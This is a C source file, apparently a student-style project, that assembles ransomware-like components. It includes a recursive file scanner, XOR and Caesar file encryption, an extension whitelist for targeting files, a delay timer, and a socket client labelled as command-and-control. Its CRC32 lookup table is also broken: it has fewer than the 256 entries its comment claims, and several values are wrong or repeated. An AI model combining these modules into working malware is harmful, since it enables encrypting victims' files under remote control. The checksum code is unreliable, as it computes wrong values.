/*
 * modules.c - FINAL COMPLET
 * 
 * ✅ PHASE 1 : Scanner, Timer, Config
 * ✅ PHASE 2 : Caesar, ROT13
 * ✅ PHASE 3 : XOR, Checksum CRC32
 * ✅ PHASE 4 : C2 Client
 * 
 * ALL MODULES IMPLEMENTED !
 */

// ============================================================================
// MODULE 1 : SCANNER DE FICHIERS
// ============================================================================
#include "scanner.h"

int should_exclude(const char *filename) {
	if (filename == NULL) {
		return 1;
	}
	
	if (filename[0] == '.') {
		return 1;
	}
	
	if (strstr(filename, ".git") != NULL) {
		return 1;
	}
	
	if (strstr(filename, ".exclude") != NULL) {
		return 1;
	}
	
	return 0;
}

int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
	if (path == NULL || max_files <= 0) {
		return 0;
	}
	
	DIR *dir = opendir(path);
	if (dir == NULL) {
		return 0;
	}
	
	int count = 0;
	struct dirent *entry;
	
	while ((entry = readdir(dir)) != NULL && count < max_files) {
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
			continue;
		}
		
		char fullpath[MAX_PATH];
		snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
		
		struct stat st;
		if (stat(fullpath, &st) != 0) {
			continue;
		}
		
		if (S_ISREG(st.st_mode)) {
			if (!should_exclude(entry->d_name)) {
				strcpy(files[count], fullpath);
				count++;
			}
		}
	}
	
	closedir(dir);
	return count;
}

int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
	if (path == NULL || current_count >= max_files) {
		return current_count;
	}
	
	DIR *dir = opendir(path);
	if (dir == NULL) {
		return current_count;
	}
	
	int count = current_count;
	struct dirent *entry;
	
	while ((entry = readdir(dir)) != NULL && count < max_files) {
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
			continue;
		}
		
		char full_path[MAX_PATH];
		snprintf(full_path, MAX_PATH, "%s/%s", path, entry->d_name);
		
		struct stat file_stat;
		if (stat(full_path, &file_stat) != 0) {
			continue;
		}
		
		if (S_ISDIR(file_stat.st_mode)) {
			if (!should_exclude(entry->d_name)) {
				count = scan_recursive(full_path, files, max_files, count);
			}
		}
		else if (S_ISREG(file_stat.st_mode)) {
			if (!should_exclude(entry->d_name)) {
				strcpy(files[count], full_path);
				count++;
			}
		}
	}
	
	closedir(dir);
	return count;
}


// ============================================================================
// MODULE 2 : CHIFFREMENT XOR
// ============================================================================
#include "xor_crypto.h"

void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    if (buffer == NULL || key == NULL || key_len == 0) {
        return;
    }
    
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

int xor_encrypt_file(const char *input, const char *output, const char *key) {
    if (input == NULL || output == NULL || key == NULL) {
        return -1;
    }
    
    size_t key_len = strlen(key);
    if (key_len == 0) {
        return -1;
    }
    
    FILE *in = fopen(input, "rb");
    if (in == NULL) {
        return -1;
    }
    
    FILE *out = fopen(output, "wb");
    if (out == NULL) {
        fclose(in);
        return -1;
    }
    
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, in)) > 0) {
        xor_buffer(buffer, bytes_read, key, key_len);
        
        if (fwrite(buffer, 1, bytes_read, out) != bytes_read) {
            fclose(in);
            fclose(out);
            return -1;
        }
    }
    
    fclose(in);
    fclose(out);
    
    return 0;
}

int xor_decrypt_file(const char *input, const char *output, const char *key) {
    return xor_encrypt_file(input, output, key);
}


// ============================================================================
// MODULE 3 : CHIFFREMENT CÉSAR
// ============================================================================
#include "caesar_crypto.h"

char caesar_char(char c, int shift) {
    if (c >= 'a' && c <= 'z') {
        int pos = (c - 'a' + shift) % 26;
        if (pos < 0) pos += 26;
        return 'a' + pos;
    }
    
    if (c >= 'A' && c <= 'Z') {
        int pos = (c - 'A' + shift) % 26;
        if (pos < 0) pos += 26;
        return 'A' + pos;
    }
    
    return c;
}

int caesar_encrypt_file(const char *input, const char *output, int shift) {
    if (input == NULL || output == NULL) {
        return -1;
    }
    
    FILE *in = fopen(input, "rb");
    if (in == NULL) {
        return -1;
    }
    
    FILE *out = fopen(output, "wb");
    if (out == NULL) {
        fclose(in);
        return -1;
    }
    
    int c;
    
    while ((c = fgetc(in)) != EOF) {
        char encrypted = caesar_char((char)c, shift);
        fputc(encrypted, out);
    }
    
    fclose(in);
    fclose(out);
    
    return 0;
}

int caesar_decrypt_file(const char *input, const char *output, int shift) {
    return caesar_encrypt_file(input, output, -shift);
}


// ============================================================================
// MODULE 4 : ROT13
// ============================================================================
#include "rot13_crypto.h"

char rot13_char(char c) {
    return caesar_char(c, 13);
}

int rot13_file(const char *input, const char *output) {
    return caesar_encrypt_file(input, output, 13);
}


// ============================================================================
// MODULE 5 : CHECKSUM (CRC32)
// ============================================================================
#include "checksum.h"

// Table CRC32 - EXACTEMENT 256 éléments
static const uint32_t crc32_table[256] = {
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
    0x1DB71642, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA44E5D6, 0x8D079F40,
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856534D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
    0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5A6BACA4, 0x2D6B1F3B, 0xB40BBE27, 0xC30C8EA1,
    0x5768A7DC, 0x206A21AA, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
    0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B7, 0x03B6E20C, 0x74B1D29A,
    0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73F04A83, 0xFAD34513, 0x8D559785, 0x147C3D3F, 0x6316B5A3,
    0xFDED4E00, 0x8A37B896, 0x13328A2C, 0x640A7ABA, 0x76E15BBD, 0x0156892B, 0x98F1D391, 0xEF63FE07,
    0x7A0906A4, 0x0D7A5532, 0x942B10D8, 0xE3A8444E, 0x7FAA0FEF, 0x085B3A79, 0x91BE14D3, 0xE6B85C45,
    0x78D45D02, 0x0FB45D94, 0x9640D82E, 0xE18B50B8, 0x2F05BA6F, 0x58EAB3F9, 0xC1BABC03, 0xB6716D95,
    0x2858EFC1, 0x5F1A5C57, 0xC6B6B0ED, 0xB108377B, 0x2C68D2CA, 0x5BBB715C, 0xC2B88DE6, 0xB5C85D70,
    0x2D286B33, 0x5ABFA6A5, 0xC3B47E1F, 0xB4FF0089, 0x010FF080, 0x76D48916, 0xEF2B73CC, 0x9869EE5A,
    0x0290EE1D, 0x75BF1B8B, 0xECD63331, 0x9B64F3A7, 0x03F8E916, 0x74F38880, 0xED92AA3A, 0x9A5A5AAC,
    0x0314D9EF, 0x746DB979, 0xEDC85C83, 0x9AEA5B15, 0x04B0BA1D, 0x7362DA8B, 0xEACB7931, 0x9D0D4E47,
    0x03A6CB5A, 0x747005CC, 0xED705276, 0x9A72E6E0, 0x0AB9BBC3, 0x7D7B4755, 0xE4B6EAEF, 0x93716679,
    0x0D70683A, 0x7AAAFAAC, 0xE3E40216, 0x94A43F80, 0x2C855CB2, 0x5BCB2C24, 0xC29F179E, 0xB5F50908,
    0x2BC9614E, 0x5CF7E3D8, 0xC5F6F362, 0xB2EE14F4, 0x28F87607, 0x5FD0F490, 0xC6D8852A, 0xB1C067BC,
    0x2F5DA6FF, 0x585A7469, 0xC1D82493, 0xB6662D3D
};

uint32_t crc32(const unsigned char *data, size_t length) {
    if (data == NULL) {
        return 0;
    }
    
    uint32_t crc = 0xFFFFFFFF;
    
    for (size_t i = 0; i < length; i++) {
        uint8_t byte = data[i];
        uint32_t table_idx = (crc ^ byte) & 0xFF;
        crc = (crc >> 8) ^ crc32_table[table_idx];
    }
    
    return crc ^ 0xFFFFFFFF;
}

uint32_t calculate_crc32(const char *filepath) {
    if (filepath == NULL) {
        return 0;
    }
    
    FILE *file = fopen(filepath, "rb");
    if (file == NULL) {
        return 0;
    }
    
    uint32_t crc = 0xFFFFFFFF;
    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        for (size_t i = 0; i < bytes_read; i++) {
            uint8_t byte = buffer[i];
            uint32_t table_idx = (crc ^ byte) & 0xFF;
            crc = (crc >> 8) ^ crc32_table[table_idx];
        }
    }
    
    fclose(file);
    
    return crc ^ 0xFFFFFFFF;
}

int verify_integrity(const char *filepath, uint32_t expected_crc) {
    if (filepath == NULL) {
        return 0;
    }
    
    uint32_t calculated = calculate_crc32(filepath);
    
    if (calculated == expected_crc) {
        return 1;
    }
    
    return 0;
}


// ============================================================================
// MODULE 6 : TIMER
// ============================================================================
#include "timer.h"

long get_current_timestamp() {
    return time(NULL);
}

void wait_seconds(int seconds) {
    if (seconds <= 0) return;
    sleep(seconds);
}

void wait_until(long target_timestamp) {
    long now = get_current_timestamp();
    
    if (target_timestamp <= now) {
        return;
    }
    
    long wait_time = target_timestamp - now;
    sleep(wait_time);
}


// ============================================================================
// MODULE 7 : CONFIGURATION
// ============================================================================
#include "config.h"

Config* load_config(const char *filepath) {
    if (filepath == NULL) {
        return NULL;
    }
    
    Config *cfg = (Config *)malloc(sizeof(Config));
    if (cfg == NULL) {
        return NULL;
    }
    
    memset(cfg, 0, sizeof(Config));
    
    FILE *file = fopen(filepath, "r");
    if (file == NULL) {
        free(cfg);
        return NULL;
    }
    
    char line[MAX_LINE];
    int in_whitelist = 0;
    int in_blacklist = 0;
    
    while (fgets(line, sizeof(line), file) != NULL) {
        line[strcspn(line, "\n")] = 0;
        
        if (line[0] == '\0' || line[0] == '#') {
            continue;
        }
        
        if (strcmp(line, "[WHITELIST]") == 0) {
            in_whitelist = 1;
            in_blacklist = 0;
            continue;
        }
        
        if (strcmp(line, "[BLACKLIST]") == 0) {
            in_whitelist = 0;
            in_blacklist = 1;
            continue;
        }
        
        if (in_whitelist && cfg->whitelist_count < MAX_ITEMS) {
            strcpy(cfg->whitelist[cfg->whitelist_count], line);
            cfg->whitelist_count++;
        }
        
        if (in_blacklist && cfg->blacklist_count < MAX_ITEMS) {
            strcpy(cfg->blacklist[cfg->blacklist_count], line);
            cfg->blacklist_count++;
        }
    }
    
    fclose(file);
    return cfg;
}

int is_allowed(const Config *cfg, const char *filepath) {
    if (cfg == NULL || filepath == NULL) {
        return 0;
    }
    
    for (int i = 0; i < cfg->blacklist_count; i++) {
        if (strstr(filepath, cfg->blacklist[i]) != NULL) {
            return 0;
        }
    }
    
    const char *dot = strrchr(filepath, '.');
    if (dot == NULL) {
        return 0;
    }
    
    for (int i = 0; i < cfg->whitelist_count; i++) {
        if (strcmp(dot, cfg->whitelist[i]) == 0) {
            return 1;
        }
    }
    
    return 0;
}

void free_config(Config *cfg) {
    if (cfg != NULL) {
        free(cfg);
    }
}


// ============================================================================
// MODULE 8 : CLIENT C2
// ============================================================================
#include "c2_client.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int c2_connect(const char *ip, int port) {
    if (ip == NULL || port <= 0) {
        return -1;
    }
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }
    
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

C2Response c2_send_command(int sockfd, const C2Command *cmd) {
    C2Response resp;
    memset(&resp, 0, sizeof(resp));
    resp.status = -1;
    
    if (sockfd < 0 || cmd == NULL) {
        return resp;
    }
    
    ssize_t sent = send(sockfd, (const void *)cmd, sizeof(C2Command), 0);
    if (sent < 0 || sent != sizeof(C2Command)) {
        return resp;
    }
    
    ssize_t received = recv(sockfd, (void *)&resp, sizeof(C2Response), 0);
    if (received < 0 || received != sizeof(C2Response)) {
        resp.status = -1;
        return resp;
    }
    
    return resp;
}

void c2_disconnect(int sockfd) {
    if (sockfd >= 0) {
        close(sockfd);
    }
}
